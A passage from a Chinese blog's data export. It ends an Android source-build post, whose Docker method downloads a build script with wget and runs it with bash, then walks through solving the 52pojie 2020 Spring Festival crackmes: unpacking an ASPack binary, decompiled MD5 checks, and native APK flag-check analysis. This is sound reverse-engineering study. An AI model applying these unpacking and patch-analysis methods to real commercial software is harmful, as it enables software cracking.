编译当前目录下的模块，当前目录下要有 Android.mk 文件 mmm 编译指定路径下的模块，指定路径下要有 Android.mk 文件 make snod 部分编译完后，使用该命令来编译的结果整合到镜像中 使用 Docker 进行编译 Android 源码源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下： 1234cd &amp;&amp; mkdir buildexport AOSP_VOL=\"$HOME/build\"wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh # 连接不上的话改一下hostsbash build-kitkat.sh Referenceshttps://www.bilibili.com/video/av45424886https://source.android.com/setup?hl=enhttps://jingyan.baidu.com/article/d621e8dae805272865913fa7.htmlhttps://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.htmlhttps://blog.csdn.net/u012417380/article/details/72809141https://blog.csdn.net/u012417380/article/details/73196722https://blog.csdn.net/u012417380/article/details/73353670https://blog.csdn.net/sergeycao/article/details/46459419https://www.jianshu.com/p/3bdf6e9f9dfehttp://shxi.me/posts/7b82cd68.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"2020春节-吾爱破解解题领红包活动","slug":"[TODO]2020春节-吾爱破解解题领红包活动","date":"2020-02-11T03:37:58.000Z","updated":"2020-03-15T04:07:00.942Z","comments":true,"path":"2020/02/11/[TODO]2020春节-吾爱破解解题领红包活动/","link":"","permalink":"blog.b3ale.cn/2020/02/11/[TODO]2020春节-吾爱破解解题领红包活动/","excerpt":"第二次参加领红包活动，这次有两题是 apk。","text":"第二次参加领红包活动，这次有两题是 apk。 【春节】解题领红包之一公众号回复直接得到口令： 【春节】解题领红包之二查壳发现有 ASPack 壳，直接上 ESP 定律把壳脱掉： 然后用 OD 看一下 dump 下来的程序，先搜索字符串，可以看到输入正确后返回的字符串： 然后定位到具体的函数位置，看下来感觉有点复杂，但大概可以看到涉及到了三个字符串，可以判断出是类似 MD5 的哈希摘要： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848500617D34 . 8D4D F0 LEA ECX,DWORD PTR SS:[EBP-0x10]00617D37 . 8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804] ; dumped_.0062B6AC00617D3D . 8B12 MOV EDX,DWORD PTR DS:[EDX]00617D3F . 8D45 FC LEA EAX,DWORD PTR SS:[EBP-0x4]00617D42 . E8 597DE1FF CALL dumped_.0042FAA000617D47 . 8B45 F0 MOV EAX,DWORD PTR SS:[EBP-0x10]00617D4A . BA B87E6100 MOV EDX,dumped_.00617EB8 ; E7EE5F4653E31955CACC7CD68E2A783900617D4F . E8 A42DDFFF CALL dumped_.0040AAF800617D54 . 0F9445 E7 SETE BYTE PTR SS:[EBP-0x19]00617D58 . 33C0 XOR EAX,EAX00617D5A . 5A POP EDX00617D5B . 59 POP ECX00617D5C . 59 POP ECX00617D5D . 64:8910 MOV DWORD PTR FS:[EAX],EDX00617D60 . 68 757D6100 PUSH dumped_.00617D7500617D65 &gt; 8D45 F0 LEA EAX,DWORD PTR SS:[EBP-0x10]00617D68 . E8 4F1FDFFF CALL dumped_.00409CBC00617D6D . C3 RETN00617D6E .- E9 6515DFFF JMP dumped_.004092D800617D73 .^ EB F0 JMP SHORT dumped_.00617D6500617D75 . 807D E7 00 CMP BYTE PTR SS:[EBP-0x19],0x000617D79 . 74 57 JE SHORT dumped_.00617DD200617D7B . 33C0 XOR EAX,EAX00617D7D . 55 PUSH EBP00617D7E . 68 CB7D6100 PUSH dumped_.00617DCB00617D83 . 64:FF30 PUSH DWORD PTR FS:[EAX]00617D86 . 64:8920 MOV DWORD PTR FS:[EAX],ESP00617D89 . 8D45 EC LEA EAX,DWORD PTR SS:[EBP-0x14]00617D8C . E8 2B1FDFFF CALL dumped_.00409CBC00617D91 . 8D4D EC LEA ECX,DWORD PTR SS:[EBP-0x14]00617D94 . 8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804] ; dumped_.0062B6AC00617D9A . 8B12 MOV EDX,DWORD PTR DS:[EDX]00617D9C . 8D45 F8 LEA EAX,DWORD PTR SS:[EBP-0x8]00617D9F . E8 7C7CE1FF CALL dumped_.0042FA2000617DA4 . 8B45 EC MOV EAX,DWORD PTR SS:[EBP-0x14]00617DA7 . BA 087F6100 MOV EDX,dumped_.00617F08 ; ea6b2efbdd4255a9f1b3bbc6399b58f400617DAC . E8 472DDFFF CALL dumped_.0040AAF800617DB1 . 0F9445 E6 SETE BYTE PTR SS:[EBP-0x1A]00617DB5 . 33C0 XOR EAX,EAX00617DB7 . 5A POP EDX00617DB8 . 59 POP ECX00617DB9 . 59 POP ECX00617DBA . 64:8910 MOV DWORD PTR FS:[EAX],EDX00617DBD . 68 D67D6100 PUSH dumped_.00617DD600617DC2 &gt; 8D45 EC LEA EAX,DWORD PTR SS:[EBP-0x14]00617DC5 . E8 F21EDFFF CALL dumped_.00409CBC00617DCA . C3 RETN00617DCB .- E9 0815DFFF JMP dumped_.004092D800617DD0 .^ EB F0 JMP SHORT dumped_.00617DC200617DD2 &gt; C645 E6 00 MOV BYTE PTR SS:[EBP-0x1A],0x000617DD6 . 807D E6 00 CMP BYTE PTR SS:[EBP-0x1A],0x000617DDA . 74 6D JE SHORT dumped_.00617E4900617DDC . 33C0 XOR EAX,EAX00617DDE . 55 PUSH EBP00617DDF . 68 2C7E6100 PUSH dumped_.00617E2C00617DE4 . 64:FF30 PUSH DWORD PTR FS:[EAX]00617DE7 . 64:8920 MOV DWORD PTR FS:[EAX],ESP00617DEA . 8D45 E8 LEA EAX,DWORD PTR SS:[EBP-0x18]00617DED . E8 CA1EDFFF CALL dumped_.00409CBC00617DF2 . 8D4D E8 LEA ECX,DWORD PTR SS:[EBP-0x18]00617DF5 . 8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804] ; dumped_.0062B6AC00617DFB . 8B12 MOV EDX,DWORD PTR DS:[EDX]00617DFD . 8D45 F4 LEA EAX,DWORD PTR SS:[EBP-0xC]00617E00 . E8 1B7CE1FF CALL dumped_.0042FA2000617E05 . 8B45 E8 MOV EAX,DWORD PTR SS:[EBP-0x18]00617E08 . BA 587F6100 MOV EDX,dumped_.00617F58 ; c8d46d341bea4fd5bff866a65ff8aea900617E0D . E8 E62CDFFF CALL dumped_.0040AAF800617E12 . 0F9445 E5 SETE BYTE PTR SS:[EBP-0x1B]00617E16 . 33C0 XOR EAX,EAX00617E18 . 5A POP EDX00617E19 . 59 POP ECX00617E1A . 59 POP ECX00617E1B . 64:8910 MOV DWORD PTR FS:[EAX],EDX00617E1E . 68 337E6100 PUSH dumped_.00617E3300617E23 &gt; 8D45 E8 LEA EAX,DWORD PTR SS:[EBP-0x18]00617E26 . E8 911EDFFF CALL dumped_.00409CBC00617E2B . C3 RETN00617E2C .- E9 A714DFFF JMP dumped_.004092D800617E31 .^ EB F0 JMP SHORT dumped_.00617E2300617E33 . 807D E5 00 CMP BYTE PTR SS:[EBP-0x1B],0x000617E37 . 74 10 JE SHORT dumped_.00617E4900617E39 . 83C9 FF OR ECX,-0x100617E3C . 83CA FF OR EDX,-0x100617E3F . B8 A87F6100 MOV EAX,dumped_.00617FA8 ; 请把答案回复到论坛公众号！00617E44 . E8 236BF5FF CALL dumped_.0056E96C 抛弃 OD，把 dump 下来的程序导入 IDA，根据前面找到的 unicode 字符串定位到函数，反编译后得到如下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114int __fastcall TForm1_edtPwdChange(int a1)&#123; int v1; // ebx int v2; // edx int len; // eax int md5Handler; // esi char v5; // zf unsigned int v7; // [esp-18h] [ebp-58h] int *v8; // [esp-14h] [ebp-54h] char *v9; // [esp-10h] [ebp-50h] unsigned int v10; // [esp-Ch] [ebp-4Ch] void *v11; // [esp-8h] [ebp-48h] int *v12; // [esp-4h] [ebp-44h] int v13; // [esp+8h] [ebp-38h] int v14; // [esp+Ch] [ebp-34h] int v15; // [esp+10h] [ebp-30h] int v16; // [esp+14h] [ebp-2Ch] int v17; // [esp+18h] [ebp-28h] int v18; // [esp+1Ch] [ebp-24h] int v19; // [esp+20h] [ebp-20h] char v20; // [esp+25h] [ebp-1Bh] char v21; // [esp+26h] [ebp-1Ah] char v22; // [esp+27h] [ebp-19h] char *string3; // [esp+28h] [ebp-18h] char *string2; // [esp+2Ch] [ebp-14h] char *string1; // [esp+30h] [ebp-10h] char s3; // [esp+34h] [ebp-Ch] char s2; // [esp+38h] [ebp-8h] char s1; // [esp+3Ch] [ebp-4h] int savedregs; // [esp+40h] [ebp+0h] v1 = a1; v12 = &amp;savedregs; v11 = &amp;loc_617E9C; v10 = __readfsdword(0); __writefsdword(0, (unsigned int)&amp;v10); sub_541DB8(*(Controls::TControl **)(a1 + 976), &amp;v19); len = v19; if ( v19 ) len = *(_DWORD *)(v19 - 4); if ( len == 15 ) // input's length should be 15 &#123; LOBYTE(v2) = 1; md5Handler = sub_616B84(&amp;cls_IdHashMessageDigest_TIdHashMessageDigest5, v2);// get MD5 handler v9 = &amp;s1; sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v17); sub_50F2EC(v17, 7, &amp;v18); registerFunc(md5Handler, v18, 0, (int)&amp;s1); v9 = &amp;s2; v8 = &amp;v16; sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v15); Compprod::TComponentsPageProducer::HandleTag(&amp;v16); registerFunc(md5Handler, v16, 0, (int)&amp;s2); v9 = &amp;s3; sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v13); unknown_libname_807(v13, 4, &amp;v14); registerFunc(md5Handler, v14, 0, (int)&amp;s3); v9 = (char *)&amp;savedregs; v8 = (int *)&amp;loc_617D6E; v7 = __readfsdword(0); __writefsdword(0, (unsigned int)&amp;v7); freeMem(&amp;string1); sub_42FAA0((int *)&amp;s1, 0, (int *)&amp;string1); compareStr(string1, (char *)L\"E7EE5F4653E31955CACC7CD68E2A7839\");// compare string1 v22 = v5; __writefsdword(0, v7); v9 = (char *)&amp;loc_617D75; freeMem(&amp;string1); if ( v22 ) &#123; v9 = (char *)&amp;savedregs; v8 = (int *)&amp;loc_617DCB; v7 = __readfsdword(0); __writefsdword(0, (unsigned int)&amp;v7); freeMem(&amp;string2); sub_42FA20(&amp;s2, 0, &amp;string2); compareStr(string2, (char *)L\"ea6b2efbdd4255a9f1b3bbc6399b58f4\");// compare string2 v21 = v5; __writefsdword(0, v7); v9 = (char *)&amp;loc_617DD6; freeMem(&amp;string2); &#125; else &#123; v21 = 0; &#125; if ( v21 ) &#123; v9 = (char *)&amp;savedregs; v8 = (int *)&amp;loc_617E2C; v7 = __readfsdword(0); __writefsdword(0, (unsigned int)&amp;v7); freeMem(&amp;string3); sub_42FA20(&amp;s3, 0, &amp;string3); compareStr(string3, (char *)L\"c8d46d341bea4fd5bff866a65ff8aea9\");// compare string3 v20 = v5; __writefsdword(0, v7); v9 = (char *)&amp;loc_617E33; freeMem(&amp;string3); if ( v20 ) // Success createDialog((int)L\"请把答案回复到论坛公众号！\", -1, -1); &#125; &#125; __writefsdword(0, v10); v12 = (int *)&amp;loc_617EA3; freeMem(&amp;v13); freeMem(&amp;v14); freeMem(&amp;v15); freeMem(&amp;v16); freeMem(&amp;v17); freeMem(&amp;v18); freeMem(&amp;v19); return sub_409D1C(&amp;string3, 6);&#125; 反编译后的代码也比较含糊，但可以猜到，输入的字符串长度为 15，字符串被分成了 3 部分，每部分分别进行 MD5 哈希，并与内存中的字符串进行比较，字符串正确就会弹出一个正确的对话窗口。MD5 在理论上是不可逆的，但可以在通过搜索引擎查找网上已经被爆破出的对应的明文。第一部分的解密结果： 第二部分的解密结果： 第三部分的解密结果： 将得到的字符串拼接并进行验证： 回复公众号得到口令 【春节】解题领红包之三这题给的是一个 apk，先使用 jdax 打开，查看程序入口点 MainActivity，得到如下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.wuaipojie.crackme01;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity implements OnClickListener &#123; private Button btn_click; private EditText editText; private native boolean checkFlag(String str); public native void onClick(View view); static &#123; /* JADX: method processing error *//*Error: java.lang.NullPointerException at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.searchTryCatchDominators(ProcessTryCatchRegions.java:75) at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.process(ProcessTryCatchRegions.java:45) at jadx.core.dex.visitors.regions.RegionMakerVisitor.postProcessRegions(RegionMakerVisitor.java:63) at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:58) at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31) at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17) at jadx.core.ProcessClass.process(ProcessClass.java:37) at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:280) at jadx.api.JavaClass.decompile(JavaClass.java:62)*/ /* r0 = \"crack_j2c\"; Catch:&#123; UnsatisfiedLinkError -&gt; 0x0005 &#125; java.lang.System.loadLibrary(r0); Catch:&#123; UnsatisfiedLinkError -&gt; 0x0005 &#125; L_0x0005: return; */ throw new UnsupportedOperationException(\"Method not decompiled: com.wuaipojie.crackme01.MainActivity.&lt;clinit&gt;():void\"); &#125; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); this.editText = (EditText) findViewById(R.id.input_flag); Button button = (Button) findViewById(R.id.button); this.btn_click = button; button.setOnClickListener(this); &#125;&#125; 主要有三个函数，onCreate() 在 Java 层中实现，可以看出整个界面中有一个文本框和一个按钮，并设置了一个按钮的监听事件，即 onClick；onClick() 和 checkFlag() 可以看到是在 Native 层进行实现的，可以从 lib 文件夹中找到 so 文件，接下来用 IDA 对 so 中的两个函数进行分析。导入 IDA 后，通过函数名可以看出两个函数通过静态注册： 然后先来看 onClick 函数。这边略过一些导入 jni.h 等一些分析的过程（一般静态注册函数的第一个参数是 JNIEnv 等等），在分析的过程中大致猜测出两个函数 sub_5288 和 sub_539C 两个函数分别用来获取指定的方法（getMethod）或者是域（getField）。接下来直接来看分析过后的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184int __fastcall Java_com_wuaipojie_crackme01_MainActivity_onClick__Landroid_view_View_2(_JNIEnv *env, int a2, int a3)&#123; _JNIEnv *env_; // r4 int v4; // r5 int v5; // r9 int v6; // r0 int v7; // r5 jstring (__cdecl *v8)(JNIEnv *, const char *); // r2 int v9; // r6 int v10; // r8 int v11; // r6 int v12; // r8 int len; // r5 int v14; // r5 const char *v15; // r1 int v16; // r6 int v17; // r5 int result; // r0 JNINativeMethod method; // [sp+4h] [bp-74h] int v20; // [sp+10h] [bp-68h] int v21; // [sp+14h] [bp-64h] int v22; // [sp+18h] [bp-60h] int v23; // [sp+1Ch] [bp-5Ch] int v24; // [sp+20h] [bp-58h] int v25; // [sp+24h] [bp-54h] int a3a; // [sp+28h] [bp-50h] int v27; // [sp+2Ch] [bp-4Ch] int v28; // [sp+30h] [bp-48h] int v29; // [sp+34h] [bp-44h] int v30; // [sp+38h] [bp-40h] int a2a; // [sp+3Ch] [bp-3Ch] int v32; // [sp+40h] [bp-38h] int v33; // [sp+48h] [bp-30h] int v34; // [sp+50h] [bp-28h] int v35; // [sp+58h] [bp-20h] env_ = env; v4 = a3; a2a = 0; v29 = 0; v30 = 0; v27 = 0; v28 = 0; v25 = 0; a3a = 0; v23 = 0; v24 = 0; v21 = 0; v22 = 0; method.fnPtr = 0; v20 = 0; v5 = ((int (__fastcall *)(_JNIEnv *, int))env-&gt;functions-&gt;NewLocalRef)(env, a2); v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;NewLocalRef)(env_, v4); if ( !v5 ) goto LABEL_38; v7 = v6; method.name = \"editText\"; method.signature = \"Landroid/widget/EditText;\"; if ( getFields(env_, &amp;a2a, &amp;a3a, 0, \"com/wuaipojie/crackme01/MainActivity\", method) ) goto LABEL_39; v9 = ((int (__fastcall *)(_JNIEnv *, int, int))env_-&gt;functions-&gt;GetObjectField)(env_, v5, a3a); if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; if ( v7 ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v7); if ( !v9 ) goto LABEL_38; if ( !v25 ) &#123; method.name = \"getText\"; method.signature = \"()Landroid/text/Editable;\"; if ( getMethods(env_, &amp;v30, &amp;v25, 0, \"android/widget/EditText\", method) ) goto LABEL_39; &#125; v10 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v9);// get input string if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v9); if ( !v10 ) goto LABEL_38; if ( !v24 ) &#123; method.name = \"toString\"; method.signature = \"()Ljava/lang/String;\"; if ( getMethods(env_, &amp;v29, &amp;v24, 0, \"java/lang/Object\", method) ) goto LABEL_39; &#125; v11 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v10);// convert object to string if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v10); if ( !v11 ) goto LABEL_38; if ( !v23 ) &#123; method.name = \"trim\"; method.signature = \"()Ljava/lang/String;\"; if ( getMethods(env_, &amp;v28, &amp;v23, 0, \"java/lang/String\", method) ) goto LABEL_39; &#125; v12 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v11);// trim string if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v11); if ( !v12 ) goto LABEL_38; if ( !v22 ) &#123; method.name = \"length\"; method.signature = \"()I\"; if ( getMethods(env_, &amp;v28, &amp;v22, 0, \"java/lang/String\", method) ) goto LABEL_39; &#125; len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallIntMethodA)(env_, v12);// get string's length if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; if ( len == 30 ) // len(flag) == 30 &#123; if ( !v21 ) &#123; method.name = \"checkFlag\"; method.signature = \"(Ljava/lang/String;)Z\"; if ( getMethods(env_, &amp;a2a, &amp;v21, 0, \"com/wuaipojie/crackme01/MainActivity\", method) ) goto LABEL_39; &#125; v32 = v12; v14 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v5);// invoke checkFlag method if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_39; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12); v8 = env_-&gt;functions-&gt;NewStringUTF; if ( !v14 ) goto LABEL_40; v15 = \"正确！！！回复你输入的内容到吾爱破解论坛公众号\"; // correct &#125; else &#123; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12); v15 = \"flag长度必须为30位\"; // flag's length must equal to 30 v8 = env_-&gt;functions-&gt;NewStringUTF; &#125; while ( 1 ) &#123; v16 = ((int (__fastcall *)(_JNIEnv *, const char *))v8)(env_, v15); if ( v20 || (method.name = \"makeText\", method.signature = \"(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\", !getMethods(env_, &amp;v27, &amp;v20, 1, \"android/widget/Toast\", method)) ) &#123; v33 = v16; v32 = v5; v34 = 0; v17 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v27); if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) &#123; if ( v16 ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v16); if ( v17 ) &#123; if ( method.fnPtr || (method.name = \"show\", method.signature = \"()V\", !getMethods(env_, &amp;v27, (int *)&amp;method.fnPtr, 0, \"android/widget/Toast\", method)) ) &#123; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallVoidMethodA)(env_, v17); ((void (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_); &#125; &#125; else &#123;LABEL_38: sub_4EC0(env_, \"java/lang/NullPointerException\", \"NullPointerException\"); &#125; &#125; &#125;LABEL_39: result = _stack_chk_guard - v35; if ( _stack_chk_guard == v35 ) break;LABEL_40: v15 = \"验证错误，继续加油\"; // wrong &#125; return result;&#125; onClick 函数中的内容主要为在点击按钮后获取输入内容，并判断输入的字符串长度是否为 30，然后调用 checkFlag 函数对字符串进行判断。接下来再看看 checkFlag 函数，这个函数比较长，分成几段来看。首先调用了 isDebuggerConnected() 函数，猜测应该是用来反调试： 123456789101112131415161718method1.name = \"isDebuggerConnected\";method1.signature = \"()Z\";if ( !getMethods(env_, &amp;jclass, &amp;jmethodid, 1, \"android/os/Debug\", method1) )// anti-debug??&#123; t1 = (unsigned int)&amp;t_; v8 = ((int (__fastcall *)(_JNIEnv *, int, int, int *))env_-&gt;functions-&gt;CallStaticBooleanMethodA)( env_, jclass, jmethodid, &amp;t_); if ( !(((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) | v8) ) &#123; key1 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 9); if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_7; &#125; goto LABEL_4;&#125; 接下来将一串字符串分成三部分（key1 = “thisiskey”，key2 = “52pojie_2020_happy_chinese_new_year”，key3 = “20200125”）并分给了三个变量： 123456789101112131415161718192021222324252627v6 = 0;((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, const char *))env_-&gt;functions-&gt;SetByteArrayRegion)( env_, key1, 0, 9, \"thisiskey52pojie_2020_happy_chinese_new_year20200125\");// key1 = \"thisiskey\"key2 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )&#123; v6 = 0; ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)( env_, key2, 0, 35, \"52pojie_2020_happy_chinese_new_year20200125\");// key2 = \"52pojie_2020_happy_chinese_new_year\" key3 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 8); if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) &#123; v6 = 0; ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)( env_, key3, 0, 8, \"20200125\"); // key3 = \"20200125\" 然后新建了一个 35 位的 Byte 数组，做一个循环，当 i 不为 0 且 i 是 4 的倍数时，下标设置为 (i &gt;&gt; 2) - 1，取 key3 中的值来 append 到数组中；反之，下标设置为 i，取 key2 中的值来 append 到数组中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 arr = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35); if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) &#123; i = 0; arr_ = arr; key1_ = key1; do &#123; if ( !i || i &amp; 3 ) &#123; if ( !key2 ) goto LABEL_41; pointer = key2; i_ = i; GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion; &#125; else // if i != 0 and i % 4 == 0 &#123; pointer = key3; if ( !key3 ) goto LABEL_41; GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion; i_ = (i &gt;&gt; 2) - 1; // 0,1,2,3,4,5,6,7 &#125; ((void (__fastcall *)(_JNIEnv *, int, int, signed int, unsigned int))GetByteArrayRegion_)( env_, pointer, i_, 1, t1); key1 = (unsigned __int8)t_; if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_4; if ( !arr_ ) &#123;LABEL_41: sub_4EC0(env_, \"java/lang/NullPointerException\", \"NullPointerException\"); goto LABEL_4; &#125; LOBYTE(t_) = key1; ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, unsigned int))env_-&gt;functions-&gt;SetByteArrayRegion)( env_, arr_, i, 1, t1); if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_4; &#125; while ( i++ &lt; 0x22 ); // for i in range(35) 接下来对 byte 数组进行 MD5 哈希，然后取摘要生成 16 位的 byte 数组： 12345678910111213141516171819202122232425262728293031323334 md5Str = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, \"MD5\"); if ( !v47 ) &#123; method2.name = \"getInstance\"; method2.signature = \"(Ljava/lang/String;)Ljava/security/MessageDigest;\"; if ( getMethods(env_, &amp;v52, &amp;v47, 1, \"java/security/MessageDigest\", method2) ) goto LABEL_88; &#125; t_ = md5Str; v18 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v52);// md5 function if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; if ( md5Str ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, md5Str); if ( !v18 ) &#123;LABEL_87: sub_4EC0(env_, \"java/lang/NullPointerException\", \"NullPointerException\"); goto LABEL_88; &#125; if ( !v46 ) &#123; method2.name = \"digest\"; method2.signature = \"([B)[B\"; if ( getMethods(env_, &amp;v52, &amp;v46, 0, \"java/security/MessageDigest\", method2) ) goto LABEL_88; &#125; t_ = arr_; md5Digest = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v18);// get hash digest if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v18); if ( !md5Digest ) goto LABEL_87; 然后做一个循环，对数组中的元素和 key1 进行逐位异或： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88;idx = 0;while ( 1 ) // for i in range(16)&#123; t1 = 0x38E38E39 * (unsigned __int64)(unsigned int)idx &gt;&gt; 32;// div 9? useless if ( idx &gt;= len ) break; ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)( env_, md5Digest, idx, 1, &amp;t_); key1 = (unsigned __int8)t_; if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; if ( !key1_ ) goto LABEL_87; ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)( env_, key1_, idx % 9u, // mod 9 1, &amp;t_); ch = t_; if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) &#123; LOBYTE(t_) = ch ^ key1; // xor ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;SetByteArrayRegion)( env_, md5Digest, idx, 1, &amp;t_); if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) &#123; len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest); ++idx; if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) continue; &#125; &#125; goto LABEL_88;&#125; 接下来，将得到的 byte 数组逐位转成 hex 字符串，如果小于 0xF，即只有一位，高位补 0。将结果逐位 append 到一个新的字符串中，得到一个 32 位的字符串： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970len__ = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88;if ( len__ &gt;= 1 )&#123; j = 0; classInteger = 